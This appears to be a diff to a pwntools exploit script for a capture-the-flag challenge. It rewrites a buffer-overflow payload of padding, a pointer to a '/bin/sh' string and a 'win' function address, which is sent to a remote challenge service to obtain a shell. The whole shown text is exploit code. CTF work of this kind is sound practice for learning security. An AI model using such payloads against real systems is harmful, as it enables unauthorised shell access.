@@ -16,21 +16,13 @@ p = remote("sp33d.play.hfsc.tf", 20020)
 
 p.recvuntil(b"pwn: ")
 
-# Use the existing /bin/sh string at 0x10077a8c
-cmd_addr = 0x100bef28 - 8
+ptr_to_bin_sh = 0x100bef28 - 8
 
 # Craft payload
-payload = p32(cmd_addr)
-payload += p32(cmd_addr)
-payload += p32(cmd_addr)
-payload += p32(cmd_addr)
-payload += p32(cmd_addr)
-payload += p32(cmd_addr)
-payload += p32(0x10077a8c)
-
-payload += p32(0x10000610)      # Address of win function
-payload += p32(cmd_addr)  
-payload += p32(cmd_addr)        # First argument to win (address of "/bin/sh")
+payload = b'A' * 20
+payload += p32(ptr_to_bin_sh)
+payload += b'AAAA'
+payload += p32(0x10000610) # win+24
 
 p.sendline(payload)
 
